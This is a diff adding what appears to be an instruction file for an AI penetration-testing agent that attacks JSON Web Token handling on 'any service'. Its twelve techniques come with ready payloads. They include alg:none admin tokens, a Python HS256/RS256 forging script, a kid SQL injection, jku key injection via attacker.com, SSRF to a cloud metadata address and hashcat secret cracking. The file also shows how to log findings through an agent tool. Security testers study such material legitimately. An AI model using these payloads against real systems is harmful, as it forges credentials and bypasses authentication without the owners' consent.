@@ -1,0 +1,197 @@
+SCOPE: JSON Web Token (JWT) attack surface — algorithm confusion, header injection, signature bypass, weak secrets, and token handling flaws across any service that issues or validates JWTs.
+
+## TARGETS
+
+- Any endpoint that accepts a Bearer token in `Authorization` header
+- Cookie-based JWT (`session`, `auth`, `token`, `jwt`, `access_token`, `id_token` cookie names)
+- OAuth2 `id_token` and `access_token` fields in API responses
+- URL query parameter tokens: `?token=`, `?jwt=`, `?auth=`
+- WebSocket `Sec-WebSocket-Protocol` header carrying JWT
+- API gateway custom headers: `X-Auth-Token`, `X-JWT`, `X-Access-Token`
+- OIDC introspection endpoint: `POST /token/introspect`
+- JWKS endpoint: `GET /.well-known/jwks.json`, `/oauth/jwks`, `/api/auth/jwks`
+
+## TECHNIQUES
+
+1. **alg:none signature bypass**
+   Change the `alg` header to `"none"`, `"None"`, `"NONE"`, `"nOnE"` (case variations matter — some parsers normalize differently). Strip the signature entirely (leave trailing dot) and send the modified token.
+
+   ```
+   # Original header (base64url-decoded):
+   {"alg":"HS256","typ":"JWT"}
+
+   # Modified:
+   {"alg":"none","typ":"JWT"}
+
+   # Reconstruct token:
+   eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.<original-payload>.
+   ```
+
+   Also try omitting the signature dot entirely: `header.payload` (two parts only). Some libraries accept this. Send in Authorization header:
+
+   ```
+   GET /api/admin
+   Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.
+   ```
+
+2. **Algorithm confusion: HS256 signed with RS256 public key**
+   If the server expects RS256 (asymmetric), its public key may be publicly available (from JWKS endpoint, TLS certificate, or source). Change `alg` to `HS256` and sign the modified payload with the RS256 public key as the HMAC secret. Some libraries fall back to symmetric verification when `alg` is HS256.
+
+   ```
+   # Fetch public key:
+   GET /.well-known/jwks.json
+   {"keys":[{"kty":"RSA","n":"...","e":"AQAB","kid":"key1"}]}
+
+   # Convert JWK to PEM, then sign token:
+   python3 -c "
+   import jwt, json
+   pub = open('public.pem').read()
+   payload = {'sub':'1','role':'admin','exp':9999999999}
+   token = jwt.encode(payload, pub, algorithm='HS256', headers={'kid':'key1'})
+   print(token)
+   "
+
+   GET /api/profile
+   Authorization: Bearer <forged-HS256-token>
+   ```
+
+3. **kid (Key ID) header injection: path traversal, SQLi, LFI**
+   The `kid` header tells the verifier which key to use. If the server looks up the key from the filesystem or database using `kid` unsanitized:
+
+   **Path traversal (force known key):**
+   ```
+   # Set kid to /dev/null or /proc/sys/kernel/randomize_va_space and sign with empty string
+   {"alg":"HS256","typ":"JWT","kid":"../../dev/null"}
+   # Sign with "" (empty secret, since /dev/null is empty)
+   ```
+
+   **SQL injection (inject OR TRUE to return any key):**
+   ```
+   {"alg":"HS256","typ":"JWT","kid":"' UNION SELECT 'attacker_secret' -- "}
+   # Sign with "attacker_secret"
+   ```
+
+   **LFI (read a known file as the key):**
+   ```
+   {"alg":"HS256","typ":"JWT","kid":"/etc/passwd"}
+   # Sign with contents of /etc/passwd
+   ```
+
+4. **jku / x5u SSRF and key injection**
+   The `jku` header specifies a URL from which the verifier should fetch a JWKS. The `x5u` header specifies a URL for an X.509 certificate chain. If the verifier follows these URLs without allowlisting:
+
+   ```
+   # Host attacker JWKS at https://attacker.com/jwks.json with your own RSA keypair
+   # Forge token with:
+   {"alg":"RS256","jku":"https://attacker.com/jwks.json","kid":"attacker-key"}
+
+   # Sign with your private key; verifier fetches attacker JWKS and validates with attacker public key
+   ```
+
+   Variants: use `https://attacker.com@legit.example.com/jwks.json` (URL confusion), redirect chains, or internal addresses `http://169.254.169.254/jwks.json` for SSRF.
+
+   For `x5u`:
+   ```
+   {"alg":"RS256","x5u":"https://attacker.com/cert.pem","kid":"1"}
+   ```
+
+5. **Embedded JWK trust (self-signed key injection)**
+   The `jwk` header can embed the signing public key directly in the token header. Some verifiers trust the embedded key rather than a server-side allowlist.
+
+   ```
+   # Generate RSA keypair, embed public key in header:
+   {
+     "alg":"RS256",
+     "jwk": {"kty":"RSA","n":"<attacker-n>","e":"AQAB"},
+     "typ":"JWT"
+   }
+   # Sign with the corresponding private key — verifier uses embedded public key
+   ```
+
+6. **Weak HMAC secret brute force**
+   HS256/HS384/HS512 tokens are crackable offline if the secret is weak. Extract the token and run against common wordlists.
+
+   ```
+   # Using hashcat:
+   hashcat -a 0 -m 16500 <token> jwt_secrets.txt
+
+   # Using john:
+   john --wordlist=jwt_secrets.txt --format=HMAC-SHA256 token.txt
+   ```
+
+   Common weak secrets to always try first: `secret`, `password`, `changeme`, `jwt_secret`, `mysecret`, `supersecret`, app name, domain name, `HS256`, empty string `""`, `null`, `undefined`, `12345678`, `qwerty`.
+
+   Also try environment variable names as secrets: `JWT_SECRET`, `SECRET_KEY`, `AUTH_SECRET` — developers sometimes use the variable name itself as the value.
+
+7. **No-signature-verify library misconfiguration**
+   Some JWT libraries have a `verify` flag or require explicit algorithm specification. If the application decodes without verifying (e.g., Python `jwt.decode(token, options={"verify_signature": False})`), modify any claim including `sub`, `role`, `email`, `admin`.
+
+   Test by flipping a boolean claim:
+   ```
+   # Original payload: {"sub":"user123","admin":false}
+   # Modified payload: {"sub":"user123","admin":true}
+   # Append original signature (it's not checked)
+   ```
+
+8. **Expired token replay**
+   Some services do not validate `exp` (expiration), `nbf` (not-before), or `iat` (issued-at) claims. Test:
+
+   a. Intercept a valid token, wait for natural expiration (watch `exp` claim).
+   b. Re-send the expired token after the `exp` timestamp has passed.
+   c. If access is granted, the `exp` check is missing.
+
+   Also test: set `exp` to a past timestamp in a new token and send — if accepted, the server is not validating.
+
+   ```
+   # Token with exp in the past:
+   {"sub":"admin","exp":1000000000,"role":"admin"}
+   ```
+
+9. **JWE direct-key abuse (CEK exposure)**
+   JSON Web Encryption (JWE) tokens use `"alg":"dir"` to indicate the Content Encryption Key is used directly without wrapping. If the server accepts `alg:dir`, you can encrypt your own malicious payload with any key and the server must have the key to decrypt — but some implementations expose the CEK or accept any encrypted content. Also probe algorithm downgrade from RSA-OAEP to `dir`.
+
+   ```
+   # JWE header with dir:
+   {"alg":"dir","enc":"A256GCM"}
+   ```
+
+10. **crit header parameter handling**
+    The `crit` header lists extension headers that the server MUST understand. Some libraries skip validation of `crit` extensions if they don't recognize them, which can be used to bypass extension-based security checks (e.g., a `crit: ["b64"]` extension that disables payload encoding).
+
+    ```
+    # Token header with unknown crit extension:
+    {"alg":"HS256","typ":"JWT","crit":["extraSec"],"extraSec":"bypass"}
+    # Libraries that don't enforce crit may process the token normally
+    ```
+
+    Also test `"crit":[]` (empty array) — some libraries error on this, leaking implementation details.
+
+11. **iss (issuer) substitution across multi-tenant / federated systems**
+    If the application validates `iss` claim but accepts tokens from multiple issuers (multi-tenant SSO, federated identity), test whether a token issued by issuer A is accepted for resources owned by issuer B's tenants by simply modifying the `iss` claim (works if signature is not verified or if you have control over issuer A's signing key).
+
+    ```
+    # Original: {"iss":"https://tenant-a.auth.example.com","sub":"user1"}
+    # Modified: {"iss":"https://tenant-b.auth.example.com","sub":"user1"}
+    ```
+
+12. **aud (audience) confusion across clients**
+    If multiple client applications use the same identity provider, a token issued for client A may be accepted by client B if `aud` validation is missing or permissive. Obtain a token for a low-privilege application (mobile app, public client) and present it to the high-privilege application (admin API, internal service).
+
+    ```
+    # Token issued for: {"aud":"mobile-app"}
+    # Test against:     POST /admin/api/users (expects aud:"admin-api")
+    Authorization: Bearer <mobile-app-token>
+    ```
+
+## WHAT TO RECORD
+
+When calling `mantis_record_finding`, populate:
+
+- `title`: e.g. "JWT alg:none accepted — signature validation bypassed", "JWT HS256/RS256 confusion allows token forgery"
+- `severity`: `critical` (full auth bypass, admin access), `high` (account escalation, SSRF via jku), `medium` (weak secret cracked, expired token accepted), `low` (information disclosure from claims)
+- `url`: the endpoint where the forged token was accepted
+- `method`: HTTP method used
+- `request_headers`: include the full `Authorization: Bearer <token>` (truncate token to first 40 chars + `...` in report)
+- `response_status` and `response_body_excerpt`: show the privileged response proving acceptance
+- `evidence_notes`: which algorithm, header, or claim was exploited; original vs. modified token structure; what privilege was gained
+- `cwe`: CWE-347 (Improper Verification of Cryptographic Signature); CWE-916 (Weak Password Hash); CWE-918 (SSRF) for jku/x5u; CWE-287 (Improper Authentication)
